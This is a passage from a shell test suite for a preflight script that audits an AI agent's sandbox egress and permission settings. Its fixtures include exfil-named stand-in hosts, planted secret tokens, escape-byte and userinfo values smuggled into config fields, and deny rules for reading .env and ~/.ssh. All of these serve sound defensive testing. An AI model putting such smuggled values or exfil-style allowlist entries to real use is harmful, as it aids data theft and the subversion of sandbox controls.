  bnd_has dc20-listed-while-not-enforced 'warn egress: 1 saved WebFetch(domain:) allow(s) in .claude/settings.local.json admit these hosts with no prompt: example.org'
  bnd_no dc20-listed-while-not-enforced 'PLANTEDSECRET'
  bnd_case "$_bnd/full.json" "$_bnd/local-wf1.json" "$_bnd/user-strict.json"
  bnd_has dc20-overridden-under-strict 'ok   egress: 1 saved WebFetch(domain:) allow(s) are overridden by user-scope strictAllowlist (C35, measured)'
  bnd_case "$_bnd/full.json" "$_bnd/local-wf1.json" "$_bnd/user-strict.json" "" runtime
  bnd_has dc20-in-session 'admit these hosts with no prompt if strictAllowlist is not set at user scope: example.org'
  bnd_case "$_bnd/full.json" "$_bnd/local-wf4.json" "$_bnd/user-plain.json"
  bnd_has dc20-counts-every-entry 'warn egress: 4 saved WebFetch(domain:) allow(s)'
  bnd_has dc20-prints-only-grammar-hosts 'admit these hosts with no prompt: example.org (and 3 more entries not printed)'
  bnd_no dc20-prints-only-grammar-hosts 'UPPER'
  bnd_no dc20-prints-only-grammar-hosts '1.2.3.4'
  bnd_no dc20-prints-only-grammar-hosts 'PLANTEDSECRET'
  bnd_no dc20-prints-only-grammar-hosts 'Bash(ls)'
  bnd_case "$_bnd/full.json" "$_bnd/local-wf1.json" "$_bnd/user-plain.json" "" ci
  bnd_no dc20-not-read-in-ci 'saved WebFetch'
  # the user-host COUNT (owner Q3: count only, from a terminal, only under ENFORCED; no host is ever printed)
  printf '{"env":{"KIT_TRACKER_TOKEN":"kit-PLANTEDSECRET-placeholder-token"},"sandbox":{"network":{"strictAllowlist":true,"allowedDomains":["secret-host.example.net","api.example.org"]}}}\n' > "$_bnd/user-strict-hosts.json"
  bnd_case "$_bnd/full.json" "" "$_bnd/user-strict-hosts.json"
  bnd_has user-host-count 'info egress: the user-level allowedDomains holds 2 host(s); under strictAllowlist this is the whole list'
  bnd_has user-host-count '(SWAS-407)'
  bnd_no user-host-count 'secret-host'
  bnd_no user-host-count 'PLANTEDSECRET'
  bnd_case "$_bnd/full.json" "" "$_bnd/user-strict-hosts.json" "" runtime
  bnd_no user-host-count-not-in-session 'allowedDomains holds'
  bnd_case "$_bnd/full.json" "" "$_bnd/user-plain.json"
  bnd_no user-host-count-not-before-enforced 'allowedDomains holds'

  # ---- SWAS-474: the egress fix prints a block that parses and carries no host; the repo's hosts are listed apart, under their file's label; the exit summary leads with the strict step when egress is the gap.
  # The block cells run the REAL body from a fixture directory (so the kit's own .kit/tracker.conf never leaks in) through the existing seams (_bnd_run, PREFLIGHT_SANDBOX_*; no new knob). Hostile bytes are built at
  # run time (printf '\033', a \u001b escape inside a JSON string), so no control byte ships. The summary cells call the real check_boundary and then the real boundary_summary in one shell.
  _e4=$(mktemp -d); _e4_esc=$(printf '\033'); _e4_rj=$(command -v jq)
  mkdir -p "$_e4/trk/.kit" "$_e4/hui/.kit" "$_e4/hesc/.kit" "$_e4/md" "$_e4/stub"
  printf 'version=1\nbackend=jira\nbase_url=https://exfil2.example:8443/x\nproject=SWAS\n' > "$_e4/trk/.kit/tracker.conf"
  printf 'version=1\nbackend=jira\nbase_url=https://user@exfil3.example/x\nproject=SWAS\n' > "$_e4/hui/.kit/tracker.conf"
  printf 'version=1\nbackend=jira\nbase_url=https://exfil4.example%s/x\nproject=SWAS\n' "$_e4_esc" > "$_e4/hesc/.kit/tracker.conf"
  # six allowedDomains entries: two exact hosts (one of them twice), a scheme, a wildcard and a control byte (an escape inside the JSON string): four are not copied
  printf '{"sandbox":{"enabled":true,"network":{"allowedDomains":["exfil.example","exfil.example","https://x.example","*.x.com","ev\\u001bil.example","api.example.org"]},"filesystem":{"denyRead":["**/.env","~/.ssh"],"denyWrite":["./.claude","~/.claude/settings.json"]}},"permissions":{"deny":["WebFetch"]}}\n' > "$_e4/hostsettings.json"
  printf '{"sandbox":{"network":{"allowedDomains":["a.example","b.example"]}}}\n' > "$_e4/user-hosts.json"
  _e4_run() {  # <dir> <project> <user> [local] [env word] [PATH prefix]: the real body, --boundary-only, in <dir>; output in $_br_out
    _g_dir=$1; _g_proj=$2; _g_user=$3; _g_local=${4:-}; _g_decl=@absent; _g_env=${5:-}; _g_path=${6:-}
    _bnd_run "$_self" "--boundary-only --boundary-advisory"
  }
  _e4_blk() { printf '%s\n' "$1" | sed -n 's/^    \({"sandbox".*}\)$/\1/p'; }   # the one block line, indent stripped
  _e4_blk_ok() {  # <output>: rc 0 iff exactly one block line, valid JSON (jq -e), strictAllowlist true, allowedDomains empty, nothing else
    _e4_bn=$(printf '%s\n' "$1" | grep -c '^    {"sandbox"' || true)
    [ "$_e4_bn" -eq 1 ] || return 1
    _e4_blk "$1" | jq -e '.sandbox.network.strictAllowlist == true and .sandbox.network.allowedDomains == [] and (keys == ["sandbox"])' >/dev/null 2>&1
  }
  _e4_nohost() {  # <output>: rc 0 iff the block line names none of the fixture hosts
    _e4_b=$(_e4_blk "$1"); [ -n "$_e4_b" ] || return 1
    case "$_e4_b" in *exfil*|*api.example.org*) return 1 ;; esac
    return 0
  }
  _e4_sect() { printf '%s\n' "$1" | awk -v l="$2" 'index($0, l) { f = 1; next } f && /^      / { print; next } { f = 0 }'; }   # the host lines under one label
  _e4_chk() {  # <label> <what> <predicate fn> <output>: PASS iff the predicate holds for the output (errexit-safe: the predicate sits in an if)
    if "$3" "$4"; then echo "PASS: swas-474 [$1] $2"; else echo "FAIL: swas-474 [$1] $2 (not so: $4)"; fail=1; fi
  }
  _e4_pl="From this repo's .claude/settings.json"; _e4_tl="From this repo's .kit/tracker.conf"
  # 1: the printed block parses, carries no host; the hosts sit apart, each under its own file's label (the second with its port, scheme and path stripped)
  _e4_run "$_e4/trk" "$_e4/hostsettings.json" "$_bnd/user-plain.json"
  out=$_br_out
  bnd_has egress-block-fix-line 'FAIL egress: NOT ENFORCED and UNDECLARED [static]'
  bnd_has egress-block-add-line 'add the hosts below to any allowedDomains you already have; do not replace your list.'
  _e4_chk egress-block-parses "the printed block is one line of valid JSON (jq -e), strictAllowlist true, allowedDomains empty" _e4_blk_ok "$out"
  _e4_chk egress-block-has-no-host "no host is inside the block" _e4_nohost "$out"
  _e4_ps=$(_e4_sect "$out" "$_e4_pl"); _e4_ts=$(_e4_sect "$out" "$_e4_tl")
  if [ "$_e4_ps" = "$(printf '      api.example.org\n      exfil.example')" ]; then echo "PASS: swas-474 [project-hosts-listed] the project file's two exact hosts are listed once each, under its label"; else echo "FAIL: swas-474 [project-hosts-listed] ($_e4_ps) in $out"; fail=1; fi
  if [ "$_e4_ts" = "      exfil2.example" ]; then echo "PASS: swas-474 [tracker-host-listed] the tracker host is listed under its own label, with scheme, port and path stripped"; else echo "FAIL: swas-474 [tracker-host-listed] ($_e4_ts) in $out"; fail=1; fi
  bnd_has egress-filtered-count '4 entr(y/ies) in that file were not copied'
  bnd_no egress-hostile-bytes-not-copied 'https://x.example'
  bnd_no egress-hostile-bytes-not-copied '*.x.com'
  bnd_no egress-hostile-bytes-not-copied '8443'
  case "$out" in *"$_e4_esc"*) echo "FAIL: swas-474 [egress-no-control-byte] an escape byte reached the output"; fail=1 ;; *) echo "PASS: swas-474 [egress-no-control-byte] no escape byte reached the output" ;; esac
  # 2: a hostile base_url (userinfo; an escape byte) is refused by tracker-conf.sh get and never printed; the block still parses and no tracker label prints
  for _e4_h in hui:exfil3 hesc:exfil4; do
    _e4_run "$_e4/${_e4_h%%:*}" "$_e4/hostsettings.json" "$_bnd/user-plain.json"
    out=$_br_out
    bnd_no "tracker-conf-refused-${_e4_h%%:*}" "${_e4_h#*:}"
    bnd_no "tracker-conf-refused-${_e4_h%%:*}" "$_e4_tl"
    case "$out" in *"$_e4_esc"*) echo "FAIL: swas-474 [tracker-conf-refused-${_e4_h%%:*}] an escape byte reached the output"; fail=1 ;; *) echo "PASS: swas-474 [tracker-conf-refused-${_e4_h%%:*}] no escape byte reached the output" ;; esac
    _e4_chk "tracker-conf-refused-${_e4_h%%:*}-block" "the block still parses" _e4_blk_ok "$out"
  done
  # 3: the md backend (no .kit/tracker.conf): no tracker label, the block parses
  _e4_run "$_e4/md" "$_e4/hostsettings.json" "$_bnd/user-plain.json"
  out=$_br_out
  bnd_no md-backend-no-tracker-label "$_e4_tl"
  _e4_chk md-backend-block "the block parses" _e4_blk_ok "$out"
  # 4: an unreadable project file (the sandbox comes from the local scope): the block parses, one line says to add the hosts you use
  _e4_run "$_e4/md" /nonexistent-e4-project "$_bnd/user-plain.json" "$_bnd/full.json"
  out=$_br_out
  bnd_has project-unreadable 'FAIL egress: NOT ENFORCED and UNDECLARED'
  bnd_has project-unreadable "this repo's .claude/settings.json could not be read here; add the hosts you use to allowedDomains yourself."
  bnd_no project-unreadable "$_e4_pl"
  _e4_chk project-unreadable-block "the block parses" _e4_blk_ok "$out"
  # 5: the user file's existing hosts are counted, never printed; no count when it holds none
  _e4_run "$_e4/md" "$_bnd/full.json" "$_e4/user-hosts.json"
  out=$_br_out
  bnd_has user-has-hosts 'you already have 2 host(s) in your user-level allowedDomains; add to them.'
  bnd_no user-has-hosts 'a.example'
  bnd_no user-has-hosts 'allowedDomains holds'
  _e4_run "$_e4/md" "$_bnd/full.json" "$_bnd/user-plain.json"
  out=$_br_out
  bnd_no user-has-no-hosts 'host(s) in your user-level allowedDomains'
  # 6: in a session (SANDBOX_RUNTIME) the run reads UNVERIFIED (errata E1): no copy-whole block, no host list, and the new code reads no user-level allowedDomains (a jq stub logs every call)
  printf '#!/bin/sh\nprintf "%%s\\n" "$*" >> "%s"\nexec %s "$@"\n' "$_e4/log" "$_e4_rj" > "$_e4/stub/jq"; chmod +x "$_e4/stub/jq"; : > "$_e4/log"
  _e4_run "$_e4/trk" "$_bnd/full.json" "$_e4/user-hosts.json" "" SANDBOX_RUNTIME=1 "$_e4/stub"
  out=$_br_out
  bnd_has in-session-unverified 'warn egress: UNVERIFIED [static, agent-reported]'
  bnd_no in-session-no-block 'the user-level block to copy whole'
  bnd_no in-session-no-block "$_e4_pl"
  bnd_no in-session-no-block 'a.example'
  if [ "$(printf '%s\n' "$out" | grep -c '^    {"sandbox"' || true)" -eq 0 ]; then echo "PASS: swas-474 [in-session-no-block] no copy-whole block line is printed"; else echo "FAIL: swas-474 [in-session-no-block] a block line was printed ($out)"; fail=1; fi
  if [ -s "$_e4/log" ] && ! grep -q 'allowedDomains' "$_e4/log"; then echo "PASS: swas-474 [in-session-no-user-allowedDomains-read] jq ran (non-vacuous) and no call read a user-level allowedDomains list (the older scope read in boundary_read_scope stays)"; else echo "FAIL: swas-474 [in-session-no-user-allowedDomains-read] the stub log is empty or a call read allowedDomains: $(cat "$_e4/log")"; fail=1; fi
  # 6b (S2): a project settings file that is a symlink counts as unreadable for the host list (the sandbox comes from the local scope here); the block still parses
  ln -s "$_e4/hostsettings.json" "$_e4/hostlink.json"
  _e4_run "$_e4/trk" "$_e4/hostlink.json" "$_bnd/user-plain.json" "$_bnd/full.json"
  out=$_br_out
  bnd_has project-symlink 'FAIL egress: NOT ENFORCED and UNDECLARED'
  bnd_has project-symlink "this repo's .claude/settings.json could not be read here; add the hosts you use to allowedDomains yourself."
  bnd_no project-symlink "$_e4_pl"
  bnd_no project-symlink 'api.example.org'
  _e4_chk project-symlink-block "the block parses" _e4_blk_ok "$out"
  # 6c (S3): the tracker host is not listed a second time when the project list already holds it (it stays under the project label only)
  printf '{"sandbox":{"enabled":true,"network":{"allowedDomains":["exfil2.example","api.example.org"]},"filesystem":{"denyRead":["**/.env","~/.ssh"],"denyWrite":["./.claude","~/.claude/settings.json"]}},"permissions":{"deny":["WebFetch"]}}\n' > "$_e4/hostsettings2.json"
  _e4_run "$_e4/trk" "$_e4/hostsettings2.json" "$_bnd/user-plain.json"
  out=$_br_out
  _e4_ps=$(_e4_sect "$out" "$_e4_pl")
  if [ "$_e4_ps" = "$(printf '      api.example.org\n      exfil2.example')" ]; then echo "PASS: swas-474 [tracker-host-in-project-list] the shared host is listed under the project label"; else echo "FAIL: swas-474 [tracker-host-in-project-list] ($_e4_ps) in $out"; fail=1; fi
  bnd_no tracker-host-in-project-list "$_e4_tl"
  # 7: a declared egress opt-out prints no block (the WARN path); an undeclared read-deny beside it gives the old summary, not the strict step
  _g_dir="$_e4/trk"; _g_proj="$_bnd/full.json"; _g_user="$_bnd/user-plain.json"; _g_local=""; _g_env=""; _g_path=""; _g_decl="$_bnd/d-egress.conf"
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  out=$_br_out
  bnd_has declared-egress-warn 'WARN egress: NOT ENFORCED [static] (opted out'
  bnd_no declared-egress-no-block 'the user-level block to copy whole'
  # 8: the exit summary. check_boundary then boundary_summary, in one shell; the flags are set by the real judge
  bnd_sum() {  # <project> <user> <declaration seam> [dir] [home] [keep]: output in $out. Runs in <dir> (default: the no-tracker fixture), so the kit's own .kit/tracker.conf is never read
    out=$( unset CI GITHUB_ACTIONS SANDBOX_RUNTIME
      cd "${4:-$_e4/md}" || exit 1
      if [ -n "${5:-}" ]; then HOME="$5"; export HOME; GIT_CONFIG_NOSYSTEM=1; export GIT_CONFIG_NOSYSTEM; fi
      PREFLIGHT_SANDBOX_SETTINGS="$1"; PREFLIGHT_SANDBOX_LOCAL=/nonexistent-local; PREFLIGHT_SANDBOX_USER="${2:-/nonexistent-user}"; PREFLIGHT_SANDBOX_MANAGED=/nonexistent-managed; PREFLIGHT_BOUNDARY_OPTOUT="$3"
      PREFLIGHT_SANDBOX_OS=Darwin; PREFLIGHT_SANDBOX_TOOLS=sandbox-exec; PREFLIGHT_SANDBOX_BWRAP_OK=1
      export PREFLIGHT_SANDBOX_SETTINGS PREFLIGHT_SANDBOX_LOCAL PREFLIGHT_SANDBOX_USER PREFLIGHT_SANDBOX_MANAGED PREFLIGHT_BOUNDARY_OPTOUT PREFLIGHT_SANDBOX_OS PREFLIGHT_SANDBOX_TOOLS PREFLIGHT_SANDBOX_BWRAP_OK
      bfail=0; bunv=0
      if [ -n "${6:-}" ]; then check_boundary 2>&1; else check_boundary >/dev/null 2>&1; fi   # a sixth word keeps check_boundary's lines (for a scenario that must show which site fired)
      boundary_summary )
  }
  _e4_old='an UNDECLARED opt-out (or a malformed or UNTRUSTED declaration'; _e4_new='Agent boundary: egress is not enforced. (1) The one act every adopter owes, once per machine: merge the block printed under the egress line above into ~/.claude/settings.json'
  bnd_sum "$_bnd/full.json" "$_bnd/user-plain.json" @absent   # egress is the only gap
  bnd_has summary-egress-leads "$_e4_new"
  bnd_has summary-egress-leads 'then add the hosts you trust from the list there to sandbox.network.allowedDomains (they come from this repo; review each first). (2) Or, to opt out on purpose, declare it in .kit/boundary-optout.conf.'
  bnd_no summary-egress-alone "$_e4_old"
  bnd_sum "$_bnd/noread.json" "$_bnd/user-plain.json" "$_bnd/d-egress.conf"   # egress declared (the WARN path), read-deny undeclared: not the strict step
  bnd_no summary-declared-egress-is-not-the-gap 'egress is not enforced'
  bnd_has summary-declared-egress-is-not-the-gap "$_e4_old"
  bnd_sum "$_bnd/noread.json" "$_bnd/user-strict.json" @absent   # only read-deny
  bnd_no summary-read-deny-only 'egress is not enforced'
  bnd_has summary-read-deny-only "$_e4_old"
  bnd_sum "$_bnd/off.json" "" @absent   # the sandbox is off
  bnd_no summary-sandbox-off 'egress is not enforced'
  bnd_has summary-sandbox-off "$_e4_old"
  bnd_sum "$_bnd/full.json" "$_bnd/user-plain.json" "$_bnd/m-eq.conf"   # egress plus a MALFORMED declaration: the strict step first, then today's sentence
  case "$out" in
    *"egress is not enforced"*"$_e4_old"*) echo "PASS: swas-474 [summary-mixed] egress plus a malformed declaration: the strict step first, today's sentence after it" ;;
    *) echo "FAIL: swas-474 [summary-mixed] ($out)"; fail=1 ;;
  esac
  # the call site is wired: the line after the bfail gate calls the summary (a structural lock; the gate itself needs a clean full run, which the ambient environment may not give)
  _e4_w=$(awk '/^if \[ "\$bfail" -ne 0 \] && \[ "\$BOUNDARY_ADVISORY" -eq 0 \]/ { getline; print; exit }' "$_self")
  case "$_e4_w" in *boundary_summary*) echo "PASS: swas-474 [summary-wired] the bfail gate calls boundary_summary" ;; *) echo "FAIL: swas-474 [summary-wired] the line after the gate is '$_e4_w'"; fail=1 ;; esac
  # SWAS-775: the operator-card pointer. The FAIL exit ends with it, on the line after the summary (so after the egress block, never inside it); a run that does not fail never prints it. The exit itself needs a clean full run (as above),
  # so the order is shown the way the summary cells show it (the real check_boundary, the real summary, then the real pointer function, in one shell) and the wiring by a structural lock with a mutant.
  _op_ptr='What this means for you: docs/onboarding/operator-card.md'
  _op_wired() {  # <file>: rc 0 iff the line after the call to boundary_summary calls operator_card_pointer
    case "$(awk '/^  boundary_summary/ { getline; print; exit }' "$1")" in *operator_card_pointer*) return 0 ;; esac
    return 1
  }
  _op_ptr_of() {  # <file>: the pointer function of <file>, extracted and run in a subshell
    ( eval "$(sed -n '/^operator_card_pointer() {/,/^}/p' "$1")"; operator_card_pointer )
  }
  bnd_sum "$_e4/hostsettings.json" "$_bnd/user-plain.json" @absent "$_e4/md" "" keep   # egress is the gap: the block, then the summary
  _op_o=$(printf '%s\n%s\n' "$out" "$(_op_ptr_of "$_self")")
  case "$out" in *"$_op_ptr"*) echo "FAIL: swas-775 [pointer-not-in-summary] boundary_summary printed the pointer itself"; fail=1 ;; *) echo "PASS: swas-775 [pointer-not-in-summary] the summary does not print the pointer (the exit does)" ;; esac
  if [ "$(printf '%s\n' "$_op_o" | tail -n 1)" = "$_op_ptr" ]; then echo "PASS: swas-775 [pointer-last] the pointer function prints the card's path"; else echo "FAIL: swas-775 [pointer-last] the pointer function does not print the card's path ($_op_o)"; fail=1; fi
  _e4_chk pointer-after-block "the egress block still parses with the pointer after it" _e4_blk_ok "$_op_o"
  _op_c=$(_bnd_e2e "$_bnd/full.json" "$_bnd/user-strict.json")   # a clean boundary: the real body, advisory
  out=$_op_c
  bnd_has pointer-not-on-a-clean-run 'boundary: ON [static]'   # (the run reached the boundary line: not vacuous)
  case "$_op_c" in *"$_op_ptr"*) echo "FAIL: swas-775 [pointer-not-on-a-clean-run] a run that did not fail printed the pointer"; fail=1 ;; *) echo "PASS: swas-775 [pointer-not-on-a-clean-run] a run that did not fail prints no pointer" ;; esac
  if _op_wired "$_self"; then echo "PASS: swas-775 [pointer-wired] the original calls operator_card_pointer right after boundary_summary"; else echo "FAIL: swas-775 [pointer-wired] the original does not call the pointer after the summary"; fail=1; fi
  _op_miss() {  # <file>: rc 0 iff the line after the missing-prerequisite echo calls operator_card_pointer
    case "$(awk '/^  echo "Missing prerequisites above/ { getline; print; exit }' "$1")" in *operator_card_pointer*) return 0 ;; esac
    return 1
  }
  if _op_miss "$_self"; then echo "PASS: swas-775 [pointer-wired-missing-prereq] the missing-prerequisite exit calls operator_card_pointer"; else echo "FAIL: swas-775 [pointer-wired-missing-prereq] the line after the missing-prerequisite echo does not call the pointer"; fail=1; fi
  _op_mk=$(mktemp -d); sed '/^  echo "Missing prerequisites above/{n;s/.*/  :/;}' "$_self" > "$_op_mk/miss-dropped.sh"
  if cmp -s "$_self" "$_op_mk/miss-dropped.sh" || ! sh -n "$_op_mk/miss-dropped.sh" 2>/dev/null; then echo "FAIL: mutant pointer-missing-prereq-call-dropped did not apply or does not parse"; fail=1
  elif _op_miss "$_op_mk/miss-dropped.sh"; then echo "FAIL: mutant pointer-missing-prereq-call-dropped survived (the call is gone and the lock still reads wired)"; fail=1
  else echo "PASS: mutant pointer-missing-prereq-call-dropped is killed"; fi
  sed '/^  operator_card_pointer /s/.*/  :/' "$_self" > "$_op_mk/call-dropped.sh"; sed 's#docs/onboarding/operator-card.md#docs/gone.md#' "$_self" > "$_op_mk/path-changed.sh"
  if cmp -s "$_self" "$_op_mk/call-dropped.sh" || ! sh -n "$_op_mk/call-dropped.sh" 2>/dev/null; then echo "FAIL: mutant pointer-call-dropped did not apply or does not parse"; fail=1
  elif _op_wired "$_op_mk/call-dropped.sh"; then echo "FAIL: mutant pointer-call-dropped survived (the call is gone and the lock still reads wired)"; fail=1
  else echo "PASS: mutant pointer-call-dropped is killed"; fi
  if cmp -s "$_self" "$_op_mk/path-changed.sh" || ! sh -n "$_op_mk/path-changed.sh" 2>/dev/null; then echo "FAIL: mutant pointer-path-changed did not apply or does not parse"; fail=1
  elif [ "$(_op_ptr_of "$_op_mk/path-changed.sh")" = "$_op_ptr" ]; then echo "FAIL: mutant pointer-path-changed survived (the pointer still reads the card's path)"; fail=1
  else echo "PASS: mutant pointer-path-changed is killed"; fi
  rm -rf "$_op_mk"
  # mutants: each runs a COPY (incept.sh and tracker-conf.sh beside it), must apply and parse; the ORIGINAL must satisfy the predicate first, the mutant must lose it
  _e4_mut() {  # <name> <sed expr> <predicate fn>
    _bk=$(mktemp -d); sed "$2" "$_self" > "$_bk/preflight.sh"; cp "$_sd/incept.sh" "$_bk/incept.sh"; cp "$_sd/tracker-conf.sh" "$_bk/tracker-conf.sh"
    if cmp -s "$_self" "$_bk/preflight.sh"; then echo "FAIL: mutant $1 did not apply (the sed expression matched nothing)"; fail=1; rm -rf "$_bk"; return 0; fi
    if ! sh -n "$_bk/preflight.sh" 2>/dev/null; then echo "FAIL: mutant $1 does not parse (a mutant that cannot run would read as killed)"; fail=1; rm -rf "$_bk"; return 0; fi
    _e4_run "$_e4/trk" "$_e4/hostsettings.json" "$_bnd/user-plain.json"; _e4_orig=$_br_out
    _bnd_run "$_bk/preflight.sh" "--boundary-only --boundary-advisory"; _e4_mutd=$_br_out
    rm -rf "$_bk"
    if ! "$3" "$_e4_orig"; then echo "FAIL: mutant $1 scenario is vacuous (the original does not satisfy $3: $_e4_orig)"; fail=1; return 0; fi
    case "$_e4_mutd" in *"FAIL egress: NOT ENFORCED"*) : ;; *) echo "FAIL: mutant $1 never ran the egress block (vacuous)"; fail=1; return 0 ;; esac
    if "$3" "$_e4_mutd"; then echo "FAIL: mutant $1 survived (it still satisfies $3)"; fail=1; else echo "PASS: mutant $1 is killed"; fi
  }
  _e4_mut block-placeholder-restored '/# MUT-BLOCK$/s/allowedDomains: \[\]/allowedDomains: ["<the hosts you use>"]/' _e4_blk_ok   # (the marker is anchored at the end of the line, so only the product line matches)
  _e4_mut block-carries-hosts '/# MUT-BLOCK$/s/jq -cn \(.\)/jq -cn --arg h "$_eb_ph" \1/;/# MUT-BLOCK$/s/allowedDomains: \[\]/allowedDomains: ($h | split(" "))/' _e4_nohost
  _e4_sumord() {  # <file> <gap> <nonegress>: the summary function of <file>, extracted and run with those two flags
    ( eval "$(sed -n '/^boundary_summary() {/,/^}/p' "$1")"; _bnd_egress_gap=$2; _bnd_nonegress=$3; boundary_summary )
  }
  _e4_sw=$(mktemp -d); sed '/# MUT-SUMORDER$/s/_bsm_a=\$_bsm_strict; _bsm_b=\$_bsm_old/_bsm_a=$_bsm_old; _bsm_b=$_bsm_strict/' "$_self" > "$_e4_sw/preflight.sh"
  _e4_o1=$(_e4_sumord "$_self" 1 1); _e4_o2=$(_e4_sumord "$_e4_sw/preflight.sh" 1 1)
  _e4_vac=0
  case "$_e4_o1" in *"egress is not enforced"*"$_e4_old"*) : ;; *) _e4_vac=1 ;; esac
  if cmp -s "$_self" "$_e4_sw/preflight.sh"; then echo "FAIL: mutant summary-order-swapped did not apply (the sed expression matched nothing)"; fail=1
  elif [ "$_e4_vac" -eq 1 ]; then echo "FAIL: mutant summary-order-swapped scenario is vacuous (the original does not lead with the strict step: $_e4_o1)"; fail=1
  else
    case "$_e4_o2" in
      *"egress is not enforced"*"$_e4_old"*) echo "FAIL: mutant summary-order-swapped survived (the strict step still leads)"; fail=1 ;;
      *"$_e4_old"*"egress is not enforced"*) echo "PASS: mutant summary-order-swapped is killed (the declaration now leads)" ;;
      *) echo "FAIL: mutant summary-order-swapped never printed both sentences (vacuous: $_e4_o2)"; fail=1 ;;
    esac
  fi
  rm -rf "$_e4_sw" "$_e4"
  _g_proj=""; _g_user=""; _g_local=""; _g_mgd=""; _g_decl=""; _g_os=""; _g_env=""; _g_dir=""; _g_path=""; _g_home=""; _g_ci=""; _g_tty=""

  # ---- SWAS-1012 PR 1 (items 1, 2 and 5): the user scope follows CLAUDE_CONFIG_DIR (cells S1012-CCD-1 to -13), the egress block suggests the kit's hosts (S1012-EGR-1 to -9),
  # and the gh line carries the fix (S1012-GH-1 to -3). The cells call the real check_boundary / check_sandbox in a subshell through the existing PREFLIGHT_SANDBOX_* seams, with
  # PREFLIGHT_SANDBOX_USER UNSET (the CCD cells need the resolver, which the seam would override) and HOME, CLAUDE_CONFIG_DIR and the cwd pointing at fixtures. A cell prints one line.
  _s12=$(mktemp -d)
  mkdir -p "$_s12/cwd" "$_s12/node" "$_s12/cfgstrict" "$_s12/cfgplain" "$_s12/cfgon" "$_s12/ccd7-MARKERQ9Z" "$_s12/homestrict/.claude" "$_s12/homeplain/.claude" "$_s12/homeon/.claude"
  printf '{"sandbox":{"network":{"strictAllowlist":true}}}\n' > "$_s12/cfgstrict/settings.json"
  printf '{"permissions":{}}\n' > "$_s12/cfgplain/settings.json"
  printf '{"sandbox":{"enabled":true}}\n' > "$_s12/cfgon/settings.json"
  printf '{"permissions":{}}\n' > "$_s12/ccd7-MARKERQ9Z/settings.json"
  printf '{"sandbox":{"network":{"strictAllowlist":true}}}\n' > "$_s12/homestrict/.claude/settings.json"
  printf '{"permissions":{}}\n' > "$_s12/homeplain/.claude/settings.json"
  printf '{"sandbox":{"enabled":true}}\n' > "$_s12/homeon/.claude/settings.json"
  mkdir -p "$_s12/homehosts/.claude"
  printf '{"sandbox":{"network":{"allowedDomains":["private-host.example"]}}}\n' > "$_s12/homehosts/.claude/settings.json"
  printf '{"sandbox":{"network":{"strictAllowlist":true}}}\n' > "$_s12/mgd-strict.json"
  printf '{"permissions":{}}\n' > "$_s12/noblock.json"
  printf '{"sandbox":{"enabled":true}}\n' > "$_s12/on.json"
  printf '{"name":"fixture"}\n' > "$_s12/node/package.json"
  printf '{"sandbox":{"network":{"strictAllowlist":true,"allowedDomains":["github.com"]}}}\n' > "$_s12/u-gh.json"
  printf '{"sandbox":{"network":{"strictAllowlist":true,"allowedDomains":["results-receiver.actions.githubusercontent.com"]}}}\n' > "$_s12/u-rr.json"
  printf '{"sandbox":{"network":{"strictAllowlist":true,"allowedDomains":["private-host.example"]}}}\n' > "$_s12/u-priv.json"
  _s12_reset() {  # the scenario globals the two runners read; every cell starts from these
    _s12_cwd="$_s12/cwd"; _s12_proj="$_bnd/full.json"; _s12_home="$_s12/homeplain"; _s12_cfg=@unset; _s12_usr=""; _s12_rt=""; _s12_stk=""; _s12_sum=0
    _s12_os=Darwin; _s12_tools=sandbox-exec; _s12_ssl=""; _s12_mgd=/nonexistent-managed
  }
  _s12_bc() {  # runs check_boundary (then boundary_summary when _s12_sum is 1) in the scenario; output in $out. CLAUDE_CONFIG_DIR is set only when _s12_cfg is not @unset (an empty value is a set, empty one)
    out=$( unset CI GITHUB_ACTIONS SANDBOX_RUNTIME CLAUDE_CONFIG_DIR PREFLIGHT_SANDBOX_USER SSL_CERT_FILE SSL_CERT_DIR
      cd "$_s12_cwd" || exit 1
      HOME="$_s12_home"; export HOME
      if [ "$_s12_cfg" != @unset ]; then CLAUDE_CONFIG_DIR="$_s12_cfg"; export CLAUDE_CONFIG_DIR; fi
      if [ -n "$_s12_usr" ]; then PREFLIGHT_SANDBOX_USER="$_s12_usr"; export PREFLIGHT_SANDBOX_USER; fi
      if [ -n "$_s12_rt" ]; then SANDBOX_RUNTIME=1; export SANDBOX_RUNTIME; fi
      if [ -n "$_s12_stk" ]; then STACK="$_s12_stk"; fi
      PREFLIGHT_SANDBOX_SETTINGS="$_s12_proj"; PREFLIGHT_SANDBOX_LOCAL=/nonexistent-local; PREFLIGHT_SANDBOX_MANAGED="$_s12_mgd"; PREFLIGHT_BOUNDARY_OPTOUT=@absent
      PREFLIGHT_SANDBOX_OS=Darwin; PREFLIGHT_SANDBOX_TOOLS=sandbox-exec; PREFLIGHT_SANDBOX_BWRAP_OK=1
      export PREFLIGHT_SANDBOX_SETTINGS PREFLIGHT_SANDBOX_LOCAL PREFLIGHT_SANDBOX_MANAGED PREFLIGHT_BOUNDARY_OPTOUT PREFLIGHT_SANDBOX_OS PREFLIGHT_SANDBOX_TOOLS PREFLIGHT_SANDBOX_BWRAP_OK
      miss=0; rec=0; bfail=0; bunv=0; bwarn=0
      check_boundary 2>&1
      if [ "$_s12_sum" -eq 1 ]; then boundary_summary; fi ) || true
  }
  _s12_sb() {  # runs check_sandbox in the scenario (_s12_os, _s12_tools, _s12_ssl); output in $out
    out=$( unset CI GITHUB_ACTIONS SANDBOX_RUNTIME CLAUDE_CONFIG_DIR PREFLIGHT_SANDBOX_USER SSL_CERT_FILE SSL_CERT_DIR
      cd "$_s12_cwd" || exit 1
      HOME="$_s12_home"; export HOME
      if [ "$_s12_cfg" != @unset ]; then CLAUDE_CONFIG_DIR="$_s12_cfg"; export CLAUDE_CONFIG_DIR; fi
      if [ -n "$_s12_usr" ]; then PREFLIGHT_SANDBOX_USER="$_s12_usr"; export PREFLIGHT_SANDBOX_USER; fi
      if [ -n "$_s12_rt" ]; then SANDBOX_RUNTIME=1; export SANDBOX_RUNTIME; fi
      if [ -n "$_s12_ssl" ]; then SSL_CERT_FILE="$_s12_ssl"; export SSL_CERT_FILE; fi
      PREFLIGHT_SANDBOX_SETTINGS="$_s12_proj"; PREFLIGHT_SANDBOX_LOCAL=/nonexistent-local; PREFLIGHT_SANDBOX_MANAGED=/nonexistent-managed
      PREFLIGHT_SANDBOX_OS="$_s12_os"; PREFLIGHT_SANDBOX_TOOLS="$_s12_tools"; PREFLIGHT_SANDBOX_BWRAP_OK=1
